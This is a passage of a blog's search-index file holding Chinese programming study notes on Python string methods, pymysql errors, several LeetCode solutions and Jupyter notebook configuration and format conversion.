class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">S.startswith(prefix[,start[,end]])</span><br><span class="line"><span class="comment">#是否以prefix开头</span></span><br><span class="line">S.endswith(suffix[,start[,end]])</span><br><span class="line"><span class="comment">#以suffix结尾</span></span><br><span class="line">S.isalnum() <span class="comment">#是否全是字母和数字，并至少有一个字符</span></span><br><span class="line">S.isalpha() <span class="comment">#是否全是字母，并至少有一个字符</span></span><br><span class="line">S.isdigit() <span class="comment">#是否全是数字，并至少有一个字符</span></span><br><span class="line">S.isspace() <span class="comment">#是否全是空白字符，并至少有一个字符</span></span><br><span class="line">S.islower() <span class="comment">#S中的字母是否全是小写</span></span><br><span class="line">S.isupper() <span class="comment">#S中的字母是否全是大写</span></span><br><span class="line">S.istitle() <span class="comment">#S是否是首字母大写的</span></span><br></pre></td></tr></table></figure></p><h2 id="字符串类型转换函数，这几个函数只在string模块中有"><a href="#字符串类型转换函数，这几个函数只在string模块中有" class="headerlink" title="字符串类型转换函数，这几个函数只在string模块中有"></a>字符串类型转换函数，这几个函数只在string模块中有</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">string.atoi(s[,base])</span><br><span class="line"><span class="comment">#base默认为10，如果为0,那么s就可以是012或0x23这种形式的字符串，如果是16那么s就只能是0x23或0X12这种形式的字符串</span></span><br><span class="line">string.atol(s[,base]) <span class="comment">#转成long</span></span><br><span class="line">string.atof(s[,base]) <span class="comment">#转成float</span></span><br></pre></td></tr></table></figure><h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>这里再强调一次，字符串对象是不可改变的:<br>也就是说在python创建一个字符串后，你不能把这个字符中的某一部分改变。<br>任何上面的函数改变了字符串后，都会返回一个新的字符串，原字串并没有变。<br>也有变通的办法的:<br>可以用S=list(S)这个函数把S变为由单个字符为成员的list.<br>这样的话就可以使用S[3]=’a’的方式改变值，然后再使用S=” “.join(S)还原成字符串</p><h1 id="字符串格式化"><a href="#字符串格式化" class="headerlink" title="字符串格式化"></a>字符串格式化</h1><h2 id="操作符"><a href="#操作符" class="headerlink" title="%操作符"></a>%操作符</h2><p>更高级别的控制</p><h3 id="括号-元组"><a href="#括号-元组" class="headerlink" title="括号:元组"></a>括号:元组</h3><h3 id="S-d-4-2f-占位符（格式化符号）"><a href="#S-d-4-2f-占位符（格式化符号）" class="headerlink" title="%S%d%4.2f:占位符（格式化符号）"></a>%S%d%4.2f:占位符（格式化符号）</h3><p>%s:字符串<br>%d:整数<br>%5d:前面添加空格，总长度为5<br>%f:浮点数<br>%4.2f:总长4，2个小数位的浮点数</p><h3 id="格式化符号"><a href="#格式化符号" class="headerlink" title="%:格式化符号"></a>%:格式化符号</h3><p>print(“I’m %s. I’m %d year old” % (‘Vamei’, 99))</p><h2 id="format"><a href="#format" class="headerlink" title="format"></a>format</h2><p>默认：顺序传递<br>标准格式：{位置:值}<br><a href="https://docs.python.org/3/library/string.html#format-string-syntax" target="_blank" rel="noopener">https://docs.python.org/3/library/string.html#format-string-syntax</a><br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'&#123;1&#125; is better than &#123;0&#125;'</span>.format(<span class="string">'a'</span>,<span class="string">'b'</span>)  </span><br><span class="line"><span class="comment">#'b is better than a'</span></span><br><span class="line"><span class="string">'&#123;:10.2f&#125;'</span>.format(<span class="number">1.23456</span>) <span class="comment"># 长度为10，保留两位小数，前面空格填补</span></span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      
        <tags>
            
            <tag> python基础 </tag>
            
            <tag> wiki </tag>
            
            <tag> fix </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pythonmysql</title>
      <link href="/cs/pythonmysql/"/>
      <url>/cs/pythonmysql/</url>
      
        <content type="html"><![CDATA[<p>开始学习python的mysql连接。<br><a id="more"></a></p><h1 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h1><blockquote><ul><li><a href="https://www.apachefriends.org/zh_cn/index.html" target="_blank" rel="noopener">xampp</a></li><li><code>pip install pymysql --user</code></li><li>/xampp/phpMyadmin，打开config.inc.php文件，查看MySQL配置的用户和密码</li></ul></blockquote><p>参考教程：</p><blockquote><ul><li>菜鸟教程：<a href="http://www.runoob.com/python3/python3-mysql.html" target="_blank" rel="noopener">mysql</a> 、<a href="http://www.runoob.com/python3/python-mysql-connector.html" target="_blank" rel="noopener">mysql-connector</a></li><li><a href="https://dev.mysql.com/doc/refman/8.0/en/mysql-internals.html" target="_blank" rel="noopener">MySQL官方文档</a></li></ul></blockquote><p># </p><h1 id="错误处理"><a href="#错误处理" class="headerlink" title="错误处理"></a>错误处理</h1><p>DB API中定义了一些数据库操作的错误及异常，下表列出了这些错误和异常:</p><table><thead><tr><th>异常</th><th>描述</th></tr></thead><tbody><tr><td>Warning</td><td>当有严重警告时触发，例如插入数据是被截断等等。必须是 StandardError 的子类。</td></tr><tr><td>Error</td><td>警告以外所有其他错误类。必须是 StandardError 的子类。</td></tr><tr><td>InterfaceError</td><td>当有数据库接口模块本身的错误（而不是数据库的错误）发生时触发。 必须是Error的子类。</td></tr><tr><td>DatabaseError</td><td>和数据库有关的错误发生时触发。 必须是Error的子类。</td></tr><tr><td>DataError</td><td>当有数据处理时的错误发生时触发，例如：除零错误，数据超范围等等。 必须是DatabaseError的子类。</td></tr><tr><td>OperationalError</td><td>指非用户控制的，而是操作数据库时发生的错误。例如：连接意外断开、 数据库名未找到、事务处理失败、内存分配错误等等操作数据库是发生的错误。 必须是DatabaseError的子类。</td></tr><tr><td>IntegrityError</td><td>完整性相关的错误，例如外键检查失败等。必须是DatabaseError子类。</td></tr><tr><td>InternalError</td><td>数据库的内部错误，例如游标（cursor）失效了、事务同步失败等等。 必须是DatabaseError子类。</td></tr><tr><td>ProgrammingError</td><td>程序错误，例如数据表（table）没找到或已存在、SQL语句语法错误、 参数数量错误等等。必须是DatabaseError的子类。</td></tr><tr><td>NotSupportedError</td><td>不支持错误，指使用了数据库不支持的函数或API等。例如在连接对象上 使用.rollback()函数，然而数据库并不支持事务或者事务已关闭。 必须是DatabaseError的子类。</td></tr></tbody></table><h3 id="OperationalError-1045-“Access-denied-for-user-‘testuser‘-’localhost’-using-password-YES-”"><a href="#OperationalError-1045-“Access-denied-for-user-‘testuser‘-’localhost’-using-password-YES-”" class="headerlink" title="OperationalError: (1045, “Access denied for user ‘testuser‘@’localhost’ (using password: YES)”)"></a>OperationalError: (1045, “Access denied for user ‘testuser‘@’localhost’ (using password: YES)”)</h3><p>数据库连接错误，如何添加密码</p>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 学习笔记 </tag>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>peak-index-in-a-mountain-array</title>
      <link href="/cs/leetcode/peak-index-in-a-mountain-array/"/>
      <url>/cs/leetcode/peak-index-in-a-mountain-array/</url>
      
        <content type="html"><![CDATA[<p>简述：求山形数组中峰值的下标。<br>peak-index-in-a-mountain-array <a href="https://leetcode.com/problems/peak-index-in-a-mountain-array/" target="_blank" rel="noopener">英文</a> <a href="https://leetcode-cn.com/problems/peak-index-in-a-mountain-array/" target="_blank" rel="noopener">中文</a><br>收获：遍历一下返回就OK。<br><a id="more"></a></p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">peakIndexInMountainArray</span><span class="params">(self, A)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type A: List[int]</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(A)):</span><br><span class="line">            <span class="keyword">if</span> A[i] &gt; A[i+<span class="number">1</span>]:</span><br><span class="line">                <span class="keyword">return</span> i</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> leetcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>packtpub</title>
      <link href="/cs/packtpub/"/>
      <url>/cs/packtpub/</url>
      
        <content type="html"><![CDATA[<p>出版社<br><a id="more"></a></p><h2 id="代码下载"><a href="#代码下载" class="headerlink" title="代码下载"></a>代码下载</h2><p>在<a href="http://www.packtpub.com" target="_blank" rel="noopener">http://www.packtpub.com</a> 自己的账户页面中找到所有已购买的Packt图书，并下载相关的实例代码。<br>别处购买的图书，通过访问 <a href="http://www.packtpub.com/support" target="_blank" rel="noopener">http://www.packtpub.com/support</a> 注册有关文件，电子邮件查收代码</p><h2 id="读者反馈"><a href="#读者反馈" class="headerlink" title="读者反馈"></a>读者反馈</h2><p>出书：你对某一话题有专长，并且有兴趣写（或奉献）一本这方面的书，请参考我们的作者指南：<a href="http://www.packtpub.com/authors。" target="_blank" rel="noopener">www.packtpub.com/authors。</a><br>反馈：一般的反馈，给<a href="mailto:feedback@packtpub.com" target="_blank" rel="noopener">feedback@packtpub.com</a>发一份电子邮件，并在邮件的标题中注明这本书的书名<br>疑问：有疑问，联系<a href="mailto:questions@packtpub.com" target="_blank" rel="noopener">questions@packtpub.com</a><br>版权：怀疑有侵权行为的文档链接发送到：<a href="mailto:copyright@packetpub.com" target="_blank" rel="noopener">copyright@packetpub.com</a><br>纠错：发现错误时，访问<a href="http://www.packtpub.com/submit-errata，选择相应的书名，然后单击“errata" target="_blank" rel="noopener">http://www.packtpub.com/submit-errata，选择相应的书名，然后单击“errata</a> submissionorm”链接并输入相关错误的详细信息<br>查记录：查看先前已提交的勘误信息，访问 <a href="https://www.packtpub.com/books/" target="_blank" rel="noopener">https://www.packtpub.com/books/</a> content/support，并在其搜索域中输入相关图书的名称</p><h1 id="版权"><a href="#版权" class="headerlink" title="版权"></a>版权</h1><h2 id="Packet"><a href="#Packet" class="headerlink" title="Packet"></a>Packet</h2><p>在互联网上，版权对于所有媒介而言一直是一个很大的问题。在Packet，我们向来对于版权许可非常重视。如果你在网络上发现任何形式的我们出版过的作品，都请马上将网址或网站名称告知我们，以便于我们采取补救措施。<br>你付出的帮助是对作者权利的保护，我们也由此才能继续为你带来有价值的内容。</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> one </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>number-of-recent-calls</title>
      <link href="/cs/leetcode/number-of-recent-calls/"/>
      <url>/cs/leetcode/number-of-recent-calls/</url>
      
        <content type="html"><![CDATA[<h2 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h2><p>求3000ms前到现在的ping数。<br>number-of-recent-calls <a href="https://leetcode.com/problems/number-of-recent-calls/" target="_blank" rel="noopener">英文</a> <a href="https://leetcode-cn.com/problems/number-of-recent-calls/" target="_blank" rel="noopener">中文</a></p><h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><p>1.用list来理解collections.deque()<br>2.<a href="https://docs.python.org/3/library/collections.html" target="_blank" rel="noopener">https://docs.python.org/3/library/collections.html</a><br>3.<a href="https://www.liaoxuefeng.com/wiki/001374738125095c955c1e6d8bb493182103fac9270762a000/001411031239400f7181f65f33a4623bc42276a605debf6000" target="_blank" rel="noopener">廖雪峰collections</a><br><a id="more"></a></p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RecentCounter</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.q = collections.deque()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">ping</span><span class="params">(self, t)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type t: int</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        self.q.append(t)</span><br><span class="line">        <span class="keyword">while</span> self.q[<span class="number">0</span>] &lt; t<span class="number">-3000</span>:</span><br><span class="line">            self.q.popleft()</span><br><span class="line">        <span class="keyword">return</span> len(self.q)</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Your RecentCounter object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"># obj = RecentCounter()</span></span><br><span class="line"><span class="comment"># param_1 = obj.ping(t)</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> todo </tag>
            
            <tag> leetcode </tag>
            
            <tag> 20190116 </tag>
            
            <tag> collections </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>n-ary-tree-preorder-traversal</title>
      <link href="/cs/leetcode/n-ary-tree-preorder-traversal/"/>
      <url>/cs/leetcode/n-ary-tree-preorder-traversal/</url>
      
        <content type="html"><![CDATA[<h2 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h2><p>前序遍历 N 叉树<br>n-ary-tree-preorder-traversal <a href="https://leetcode.com/problems/n-ary-tree-preorder-traversal/" target="_blank" rel="noopener">英文</a> <a href="https://leetcode-cn.com/problems/n-ary-tree-preorder-traversal/" target="_blank" rel="noopener">中文</a></p><h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><p>list <a href="https://docs.python.org/3/tutorial/datastructures.html#more-on-lists" target="_blank" rel="noopener">官方文档</a> <a href="http://www.runoob.com/python/python-lists.html" target="_blank" rel="noopener">菜鸟教程</a><br><a id="more"></a></p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string"># Definition for a Node.</span></span><br><span class="line"><span class="string">class Node(object):</span></span><br><span class="line"><span class="string">    def __init__(self, val, children):</span></span><br><span class="line"><span class="string">        self.val = val</span></span><br><span class="line"><span class="string">        self.children = children</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">preorder</span><span class="params">(self, root)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type root: Node</span></span><br><span class="line"><span class="string">        :rtype: List[int]</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> root <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">            <span class="keyword">return</span> []</span><br><span class="line">        </span><br><span class="line">        stack, output = [root, ], []            </span><br><span class="line">        <span class="keyword">while</span> stack:</span><br><span class="line">            root = stack.pop()</span><br><span class="line">            output.append(root.val)</span><br><span class="line">            stack.extend(root.children[::<span class="number">-1</span>])</span><br><span class="line">                </span><br><span class="line">        <span class="keyword">return</span> output</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> leetcode </tag>
            
            <tag> N叉树 </tag>
            
            <tag> 遍历 </tag>
            
            <tag> 20190116 </tag>
            
            <tag> 前序 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>n-ary-tree-postorder-traversal</title>
      <link href="/cs/leetcode/n-ary-tree-postorder-traversal/"/>
      <url>/cs/leetcode/n-ary-tree-postorder-traversal/</url>
      
        <content type="html"><![CDATA[<h2 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h2><p>后序遍历 N 叉树<br>n-ary-tree-postorder-traversal <a href="https://leetcode.com/problems/n-ary-tree-postorder-traversal/" target="_blank" rel="noopener">英文</a> <a href="https://leetcode-cn.com/problems/n-ary-tree-postorder-traversal/" target="_blank" rel="noopener">中文</a></p><h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><p><img src="https://leetcode.com/problems/n-ary-tree-postorder-traversal/Figures/145_transverse.png" alt="二叉树"><br><a id="more"></a></p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string"># Definition for a Node.</span></span><br><span class="line"><span class="string">class Node(object):</span></span><br><span class="line"><span class="string">    def __init__(self, val, children):</span></span><br><span class="line"><span class="string">        self.val = val</span></span><br><span class="line"><span class="string">        self.children = children</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">postorder</span><span class="params">(self, root)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type root: Node</span></span><br><span class="line"><span class="string">        :rtype: List[int]</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> root <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">            <span class="keyword">return</span> []</span><br><span class="line">        </span><br><span class="line">        stack, output = [root, ], []</span><br><span class="line">        <span class="keyword">while</span> stack:</span><br><span class="line">            root = stack.pop()</span><br><span class="line">            output.append(root.val)</span><br><span class="line">            stack.extend(root.children)</span><br><span class="line">                </span><br><span class="line">        <span class="keyword">return</span> output[::<span class="number">-1</span>]</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> leetcode </tag>
            
            <tag> N叉树 </tag>
            
            <tag> 后序 </tag>
            
            <tag> 遍历 </tag>
            
            <tag> 20190116 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>merge-two-binary-trees</title>
      <link href="/cs/leetcode/merge-two-binary-trees/"/>
      <url>/cs/leetcode/merge-two-binary-trees/</url>
      
        <content type="html"><![CDATA[<h2 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h2><p>合并2个二叉树。<br>merge-two-binary-trees <a href="https://leetcode.com/problems/merge-two-binary-trees/" target="_blank" rel="noopener">英文</a> <a href="https://leetcode-cn.com/problems/merge-two-binary-trees/" target="_blank" rel="noopener">中文</a></p><h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><p>1.判断空树<br>2.递归<br>3.<code>TreeNode</code> , <code>self.</code><br><a id="more"></a></p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"># class TreeNode:</span></span><br><span class="line"><span class="comment">#     def __init__(self, x):</span></span><br><span class="line"><span class="comment">#         self.val = x</span></span><br><span class="line"><span class="comment">#         self.left = None</span></span><br><span class="line"><span class="comment">#         self.right = None</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">mergeTrees</span><span class="params">(self, t1, t2)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> t1 <span class="keyword">and</span> t2:</span><br><span class="line">            root = TreeNode(t1.val + t2.val)</span><br><span class="line">            root.left = self.mergeTrees(t1.left, t2.left)</span><br><span class="line">            root.right = self.mergeTrees(t1.right, t2.right)</span><br><span class="line">            <span class="keyword">return</span> root</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> t1 <span class="keyword">or</span> t2</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> leetcode </tag>
            
            <tag> 二叉树 </tag>
            
            <tag> 递归 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>k-closest-points-to-origin</title>
      <link href="/cs/leetcode/k-closest-points-to-origin/"/>
      <url>/cs/leetcode/k-closest-points-to-origin/</url>
      
        <content type="html"><![CDATA[<h2 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h2><p>一系列二维坐标值放入列表中，求出K个离原点最近的坐标值。<br>k-closest-points-to-origin <a href="https://leetcode.com/problems/k-closest-points-to-origin/" target="_blank" rel="noopener">英文</a> <a href="https://leetcode-cn.com/problems/k-closest-points-to-origin/" target="_blank" rel="noopener">中文</a></p><h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><p>1.多维下的sort<br>2.lambda的用法<br>3.列表的切片<br><a id="more"></a></p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">kClosest</span><span class="params">(self, points, K)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type points: List[List[int]]</span></span><br><span class="line"><span class="string">        :type K: int</span></span><br><span class="line"><span class="string">        :rtype: List[List[int]]</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        points.sort(key = <span class="keyword">lambda</span> P:P[<span class="number">0</span>]**<span class="number">2</span> + P[<span class="number">1</span>]**<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">return</span> points[:K]</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> leetcode </tag>
            
            <tag> 排序 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jupyter</title>
      <link href="/cs/jupyter/"/>
      <url>/cs/jupyter/</url>
      
        <content type="html"><![CDATA[<p>jupyter命令一览。<br><a id="more"></a></p><h1 id="新习"><a href="#新习" class="headerlink" title="新习"></a>新习</h1><h2 id="2018年12月13日"><a href="#2018年12月13日" class="headerlink" title="2018年12月13日"></a>2018年12月13日</h2><h3 id="jupyter-输出去掉-n"><a href="#jupyter-输出去掉-n" class="headerlink" title="jupyter 输出去掉 \n"></a>jupyter 输出去掉 <code>\n</code></h3><p>要 <code>print</code> 才出效果<br><a href="https://stackoverflow.com/questions/43835171/print-multiple-line-string-in-jupyter-notebook" target="_blank" rel="noopener">https://stackoverflow.com/questions/43835171/print-multiple-line-string-in-jupyter-notebook</a></p><h1 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h1><h2 id="官方网站"><a href="#官方网站" class="headerlink" title="官方网站"></a>官方网站</h2><p><a href="http://jupyter.org/install" target="_blank" rel="noopener">官方网站</a> </p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p><code>pip install jupyter --user</code> 安装<br><code>jupyter notebook</code> 进入笔记本</p><h2 id="修改默认路径和浏览器"><a href="#修改默认路径和浏览器" class="headerlink" title="修改默认路径和浏览器"></a>修改默认路径和浏览器</h2><p>Windows默认在chrome里面打开：<br>1.命令行：jupyter notebook –generate-config<br>2.打开文件：jupyter_notebook_config.py<br>3.在文件头部添加:<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> webbrowser</span><br><span class="line">webbrowser.register(<span class="string">'chrome'</span>, <span class="keyword">None</span>, webbrowser.GenericBrowser(<span class="string">u'C:\Program Files (x86)\Google\Chrome\Application\chrome.exe'</span>))</span><br><span class="line">c.NotebookApp.browser = <span class="string">'chrome'</span></span><br></pre></td></tr></table></figure></p><p>路径需要酌情调整。</p><h1 id="在nbviewer中查看"><a href="#在nbviewer中查看" class="headerlink" title="在nbviewer中查看"></a>在nbviewer中查看</h1><p>github文件的网址中把<code>https://github.com</code> 替换为<code>https://nbviewer.jupyter.org/github</code> 。<br>注意斜线个数。<a href="https://nbviewer.jupyter.org/github/cjql/myjupyter/blob/master/MySQL.ipynb" target="_blank" rel="noopener">典型示例</a>：<code>https://nbviewer.jupyter.org/github/cjql/myjupyter/blob/master/MySQL.ipynb</code><br><a href="http://nbviewer.jupyter.org/faq" target="_blank" rel="noopener">官方网站</a></p><h1 id="格式转换-html、md、pdf、letex"><a href="#格式转换-html、md、pdf、letex" class="headerlink" title="格式转换: html、md、pdf、letex"></a>格式转换: html、md、pdf、letex</h1><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://cloud.tencent.com/developer/article/1008571" target="_blank" rel="noopener">格式转换</a></p><h2 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h2><p><a href="https://ipython.org/ipython-doc/3/notebook/nbconvert.html" target="_blank" rel="noopener">官方文档</a><br><a href="https://cloud.tencent.com/developer/article/1008490" target="_blank" rel="noopener">腾讯云入门教程1</a> <a href="https://hub.packtpub.com/getting-started-jupyter-notebook-part-1/" target="_blank" rel="noopener">英文参考文献</a><br><a href="https://cloud.tencent.com/developer/article/1008493" target="_blank" rel="noopener">腾讯云入门教程2</a> <a href="https://hub.packtpub.com/getting-started-jupyter-notebook-part-2/" target="_blank" rel="noopener">英文参考文献</a></p><h2 id="命令式"><a href="#命令式" class="headerlink" title="命令式"></a>命令式</h2><table><thead><tr><th>命令</th><th>功能</th></tr></thead><tbody><tr><td>jupyter nbconvert –to html notebook.ipynb</td><td>ipynb转为html格式</td></tr><tr><td>jupyter nbconvert –to html –template full notebook.ipynb</td><td>对生成的html格式进行配置，默认配置，提供完整的静态html格式，交互性更强。</td></tr><tr><td>jupyter nbconvert –to html –template basic notebook.ipynb</td><td>简化的html，用于嵌入网页、博客等，这不包括html标题。</td></tr><tr><td>jupyter nbconvert –to md notebook.ipynb</td><td>简单的Markdown格式输出，cell单元不受影响，代码cell缩进4个空格。</td></tr><tr><td>jupyter nbconvert –to letex notebook.ipynb</td><td>Letex导出格式，生成后缀名为NOTEBOOK_NAME.tex的文件。</td></tr><tr><td>jupyter nbconvert –to letex -template article notebook.ipynb</td><td>默认配置，Latex文章。</td></tr><tr><td>jupyter nbconvert –to letex -template report notebook.ipynb</td><td>Latex报告，提供目录和章节。</td></tr><tr><td>jupyter nbconvert –to letex -template basic notebook.ipynb</td><td>最基本的Latex输出，经常用来自定义配置。</td></tr><tr><td>jupyter nbconvert –to pdf notebook.ipynb</td><td>转换为pdf格式分模板配置与latex配置是一样的。需要提前安装xelatex。</td></tr><tr><td>sudo apt-get install texlive-full</td><td>方法是安装texLive套装，texlive-full的安装包有点大，约1G多。</td></tr></tbody></table><h2 id="面板式"><a href="#面板式" class="headerlink" title="面板式"></a>面板式</h2><p>ipynb转换为html、md、pdf等格式，还有另一种更简单的方法：在jupyter notebook中，选择<code>File-&gt;Download as</code>，直接选择需要转换的格式就可以了。需要注意的是，转换为pdf格式之前，同样要保证已经安装了xelatex。</p>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> jupyter </tag>
            
            <tag> 学习笔记 </tag>
            
            <tag> 后续学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ireadweek</title>
      <link href="/cs/ireadweek/"/>
      <url>/cs/ireadweek/</url>
      
